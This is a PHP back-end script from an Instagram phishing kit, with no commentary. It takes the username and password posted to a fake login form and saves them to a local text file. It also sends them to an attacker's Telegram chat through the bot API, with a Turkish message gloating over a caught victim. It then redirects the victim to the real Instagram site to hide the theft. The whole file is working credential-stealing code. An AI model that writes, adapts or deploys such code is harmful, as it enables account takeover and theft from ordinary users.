<?php
include('tg.php');
 $user = $_POST["username"];
 $pass = $_POST["password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";


$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Kullanıcı Adı : '.$user.'
Şifre : '.$pass.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 header('Location: https://instagram.com/');
 exit()

